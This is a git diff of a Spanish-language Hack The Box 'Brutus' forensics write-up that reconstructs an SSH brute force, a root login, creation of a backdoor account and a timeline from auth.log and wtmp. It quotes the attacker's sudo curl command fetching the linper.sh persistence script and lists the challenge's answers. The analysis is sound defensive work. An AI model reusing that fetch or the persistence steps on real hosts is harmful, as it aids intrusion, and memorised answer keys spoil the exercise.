@@ -10,9 +10,7 @@ categories:
   - Hack_The_Box
   - Sherlocks
 tags:
-  - linux
   - hack_the_box
-  - forensics
   - dfir
 
 ---
@@ -66,7 +64,7 @@ Utmp dump of wtmp
 ![](assets/img/htb-writeup-brutus/brutus1.png)
 
 ---
-### Q1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
+### **`Q1.`** **Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?**
 
 El archivo 'auth.log' registra eventos relacionados con accesos, autenticaciones y fallos en el sistema.
 
@@ -118,9 +116,9 @@ Puedo contar los intentos fallidos de contraseña en un período de tiempo espec
 
 Esto muestra que hubo 48 intentos fallidos en un intervalo corto, lo cual es característico de un ataque de fuerza bruta.
 
-##### A1. 65.2.161.68
+> **`A1.`** **65.2.161.68**
 
-### Q2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
+### **`Q2.`** **The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?**
 
 El mensaje 'Accepted password for root' confirma que el atacante logró autenticarse exitosamente en el servidor utilizando el nombre de usuario root.
 
@@ -132,9 +130,9 @@ El mensaje 'Accepted password for root' confirma que el atacante logró autentic
 
 Adicionalmente, el sistema abrió una sesión SSH para este usuario 'pam_unix(sshd:session): session opened for user root', lo que valida que el atacante obtuvo acceso con privilegios administrativos completos.
 
-##### A2. root
+> **`A2.`** **root**
 
-### Q3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
+### **`Q3.`** **Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?**
 
 Se observan tres inicios de sesión desde la IP del atacante.
 
@@ -161,9 +159,9 @@ Según los registros en 'wtmp' el atacante inició una sesión manual desde la d
 
 Esto confirma que el atacante comenzó su sesión SSH a las 06:32:45
 
-##### A3. 2024-03-06 06:32:45
+> **`A3.`** **2024-03-06 06:32:45**
 
-### Q4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?
+### **`Q4.`** **SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?**
 
 El atacante inició sesión como root desde la dirección IP 65.2.161.68 a las 06:32:44, como se puede observar en los registros
 
@@ -176,9 +174,9 @@ Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root
 
 El registro generado por systemd-logind muestra que al inicio de sesión exitoso del atacante se le asignó la sesión 37. Esto confirma que el número de sesión relacionado con el acceso del atacante como root es 37.
 
-##### A4. 37
+> **`A4.`** **37**
 
-### Q5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+### **`Q5.`** **The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**
 
 Después del inicio de sesión del atacante a las 06:32:44, encuentro evidencia de la creación de un nuevo usuario.
 
@@ -207,9 +205,9 @@ Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group
 
 Estas acciones ocurrieron poco después del inicio de sesión del atacante, confirmando que fueron parte de su estrategia de persistencia en el sistema.
 
-##### A5. cyberjunkie
+> **`A5.`** **cyberjunkie**
 
-### Q6. What is the mitre technique id used for persistence?
+### **`Q6.`** **What is the mitre technique id used for persistence?**
 
 La técnica T1136 del MITRE ATT&CK se refiere a la creación de cuentas en el sistema como parte de la estrategia de persistencia de un atacante.
 
@@ -223,9 +221,9 @@ La técnica T1136 del MITRE ATT&CK se refiere a la creación de cuentas en el si
 
 El atacante en este caso creó una cuenta local llamada 'cyberjunkie' para garantizar el acceso persistente al servidor comprometido, lo que encaja con la técnica T1136.001.
 
-##### A6. T1136.001
+> **`A6.`** **T1136.001**
 
-### Q7. How long did the attacker’s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
+### **`Q7.`** **How long did the attacker’s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)**
 
 La hora de inicio de la sesión se obtiene de los registros del archivo wtmp, donde el atacante se conecta a las 06:32:45.
 La hora de finalización se obtiene del archivo auth.log, donde la desconexión ocurre a las 06:37:24.
@@ -249,9 +247,9 @@ Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161
 279
 ```
 
-##### A7. 279 seconds
+> **`A7.`** **279 seconds**
 
-### Q8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+### **`Q8.`** **The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
 
 A las 06:39:38, 'cyberjunkie' ejecutó un comando usando sudo para descargar un script desde una URL.
 
@@ -269,7 +267,7 @@ Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for
 
 Este comando descargó el script linper.sh desde una URL de GitHub usando 'curl'.
 
-##### A8. /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+> **`A8.`** **/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh**
  
 ---
 ### Timeline
@@ -291,5 +289,6 @@ Este comando descargó el script linper.sh desde una URL de GitHub usando 'curl'
 |	06:39:38   | cyberjunkie downloads linper.sh 	      | auth.log  |
 |	06:41:01   | Last entry in auth.log 		            | auth.log  |
 
-> <https://labs.hackthebox.com/achievement/sherlock/1521382/631>
+> <a href="https://labs.hackthebox.com/achievement/sherlock/1521382/631" target="_blank">***Litio7 has successfully solved Brutus from Hack The Box***</a>
+{: .prompt-info style="text-align:center" }
 {: .prompt-tip}
